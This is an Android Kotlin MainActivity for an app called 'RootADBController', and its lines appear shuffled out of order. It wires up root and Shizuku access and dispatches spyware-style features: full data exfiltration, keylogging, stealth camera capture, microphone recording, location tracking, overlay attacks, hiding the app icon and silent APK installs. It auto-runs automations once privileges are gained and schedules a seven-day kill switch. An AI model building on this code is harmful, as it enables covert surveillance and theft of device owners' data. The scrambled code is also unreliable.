package com.anti.rootadbcontroller

import android.content.Context.BIND_AUTO_CREATE
    private var isRootAvailable by mutableStateOf(false)
    }
    }
                if (!wasShizukuAvailable && isShizukuAvailable) {
            Constants.FEATURE_LOG_ACCESS -> featureHandler.showLogAccess(shizukuManagerService)
                    AutomationUtils.executeRootAutomations(this@MainActivity)
}
import android.content.ComponentName

        }
        bindService(intent, shizukuServiceConnection, BIND_AUTO_CREATE)
                // If Shizuku access was just gained, trigger automations
            Constants.FEATURE_SCREENSHOT -> featureHandler.takeScreenshot(shizukuManagerService)
                launch(Dispatchers.Main) {
    }
import android.app.PendingIntent
class MainActivity : ComponentActivity() {
            isShizukuAvailable = false
        val intent = Intent(this, ShizukuManagerService::class.java)

            Constants.FEATURE_SYSTEM_CONTROL -> featureHandler.rebootDevice(shizukuManagerService)
            if (isRootAvailable && !wasRootAvailable) {
        Log.d(TAG, "Kill switch scheduled for 7 days.")
import android.app.AlarmManager

            isShizukuServiceBound = false
        // Bind to Shizuku Manager Service
                Log.d(TAG, "Shizuku status - Available: $available, Permission: $hasPermission")
            Constants.FEATURE_FILE_ACCESS -> featureHandler.browseSystemFiles(shizukuManagerService)
            // If root access was just gained, trigger automations
        alarmManager.set(AlarmManager.RTC_WAKEUP, calendar.timeInMillis, pendingIntent)
import kotlinx.coroutines.launch
            shizukuManagerService = null
        super.onStart()
            launch(Dispatchers.Main) {
            Constants.FEATURE_NETWORK_MONITOR -> featureHandler.startNetworkMonitoring(shizukuManagerService)


import kotlinx.coroutines.Dispatchers
            Log.d(TAG, "Shizuku service disconnected")
    override fun onStart() {

            Constants.FEATURE_SILENT_INSTALL -> featureHandler.findAndInstallFirstApk(shizukuManagerService)
            isRootAvailable = RootUtils.isRootAvailable()
        }
import java.util.Calendar
        override fun onServiceDisconnected(name: ComponentName?) {

            isShizukuAvailable = available && hasPermission
            Constants.FEATURE_DATA_EXFILTRATION -> featureHandler.exfiltrateAllData(shizukuManagerService)
            val wasRootAvailable = isRootAvailable
            add(Calendar.DAY_OF_YEAR, 7)
import com.anti.rootadbcontroller.utils.ShizukuUtils

    }
            val wasShizukuAvailable = isShizukuAvailable
            Constants.FEATURE_KEYLOGGING -> featureHandler.openAccessibilitySettings()
        lifecycleScope.launch(Dispatchers.IO) {
        val calendar = Calendar.getInstance().apply {
import com.anti.rootadbcontroller.utils.RootUtils
        }
        }

        when (featureId) {
    private fun checkRootAccess() {

import com.anti.rootadbcontroller.utils.Constants.TAG
            checkShizukuStatus()
            }
            val hasPermission = shizukuUtils.hasShizukuPermission()
    private fun onFeatureClick(featureId: Int) {

        val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, pendingIntentFlags)
import com.anti.rootadbcontroller.utils.Constants
            isShizukuServiceBound = true
                )
            val available = shizukuUtils.isShizukuAvailable

    }

import com.anti.rootadbcontroller.utils.AutomationUtils
            shizukuManagerService = binder.service
                    onAutomationSettingsClick = { showAutomationDialog = true }
            val shizukuUtils = ShizukuUtils.getInstance()
    }
        }
        }
import com.anti.rootadbcontroller.ui.theme.RootADBControllerTheme
            val binder = service as ShizukuManagerService.ShizukuManagerBinder
                    onShizukuPermissionRequest = ::requestShizukuPermission,
        lifecycleScope.launch(Dispatchers.IO) {
        }
            Constants.FEATURE_AUTOMATION_SETTINGS -> showAutomationDialog = true
            PendingIntent.FLAG_UPDATE_CURRENT
import com.anti.rootadbcontroller.ui.MainScreen
            Log.d(TAG, "Shizuku service connected")
                    onFeatureClick = ::onFeatureClick,
    private fun checkShizukuStatus() {
            checkShizukuStatus()
            Constants.FEATURE_REMOTE_ADB -> featureHandler.toggleRemoteAdb()
            // For older versions, we can use FLAG_UPDATE_CURRENT for better compatibility
import com.anti.rootadbcontroller.services.ShizukuManagerService
        override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                    isShizukuAvailable = isShizukuAvailable,

            kotlinx.coroutines.delay(1000)
            Constants.FEATURE_SYSTEM_PROPERTIES -> featureHandler.showSystemProperties(shizukuManagerService)
        } else {
import com.anti.rootadbcontroller.features.FeatureHandler
    private val shizukuServiceConnection = object : ServiceConnection {
                    isRootAvailable = isRootAvailable,
    }
        lifecycleScope.launch(Dispatchers.IO) {
            Constants.FEATURE_PACKAGE_MANAGER -> featureHandler.showPackageManager(shizukuManagerService)
            PendingIntent.FLAG_IMMUTABLE
import androidx.lifecycle.lifecycleScope
    // Shizuku service connection
                MainScreen(
        // Any cleanup that needs to happen when the activity is fully destroyed
        // Recheck status after a delay
            Constants.FEATURE_SHIZUKU_OPERATIONS -> featureHandler.showShizukuOperations(shizukuManagerService)
            // For Android 12+ (API 31+), FLAG_IMMUTABLE is required
import androidx.compose.runtime.setValue

            RootADBControllerTheme {
        super.onDestroy()
        shizukuManagerService?.requestShizukuPermission()
            Constants.FEATURE_SET_CLIPBOARD -> featureHandler.setClipboard(getString(R.string.clipboard_pwned_text))
        val pendingIntentFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
import androidx.compose.runtime.mutableStateOf
    }
        setContent {
    override fun onDestroy() {
    private fun requestShizukuPermission() {
            Constants.FEATURE_GET_CLIPBOARD -> featureHandler.getClipboard()
        // Use appropriate flags based on Android version
import androidx.compose.runtime.getValue
        ComponentName(this, MainActivity::class.java)



            Constants.FEATURE_STEALTH_CAMERA -> featureHandler.takeStealthPicture()

import androidx.activity.compose.setContent
    private val componentName by lazy {
        scheduleKillSwitch()
    }
    }
            Constants.FEATURE_CAMERA_MIC_DETECTOR -> featureHandler.detectCameraMicUsage()
        val intent = Intent(this, com.anti.rootadbcontroller.services.KillSwitchReceiver::class.java)
import androidx.activity.ComponentActivity
    // Add missing componentName property
        ShizukuUtils.getInstance().initialize()
        }
        }
            Constants.FEATURE_HIDDEN_APP_FINDER -> featureHandler.findHiddenApps()
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
import android.util.Log

        // Initialize Shizuku Utils
            isShizukuServiceBound = false
            }
            Constants.FEATURE_OVERLAY_DETECTOR -> featureHandler.detectOverlays()
    private fun scheduleKillSwitch() {
import android.os.IBinder
    private lateinit var featureHandler: FeatureHandler
        checkRootAccess()
            unbindService(shizukuServiceConnection)
                }
            Constants.FEATURE_PERMISSIONS_SCANNER -> featureHandler.scanPermissions()

import android.os.Bundle
    private var showAutomationDialog by mutableStateOf(false)
        featureHandler = FeatureHandler(this)
        if (isShizukuServiceBound) {
                    )
            Constants.FEATURE_HIDE_APP_ICON -> featureHandler.hideAppIcon(componentName)
    }
import android.os.Build
    private var isShizukuServiceBound = false
        super.onCreate(savedInstanceState)
        super.onStop()
                        shizukuManagerService
            Constants.FEATURE_OVERLAY_ATTACK -> featureHandler.startOverlayAttack()
        }
import android.content.ServiceConnection
    private var shizukuManagerService: ShizukuManagerService? = null
    override fun onCreate(savedInstanceState: Bundle?) {
    override fun onStop() {
                        this@MainActivity,
            Constants.FEATURE_LOCATION_TRACKER -> featureHandler.startLocationTracking()
            }
import android.content.Intent
    private var isShizukuAvailable by mutableStateOf(false)


                    AutomationUtils.executeShizukuAutomations(
            Constants.FEATURE_MIC_RECORDER -> featureHandler.startMicRecording()
                }
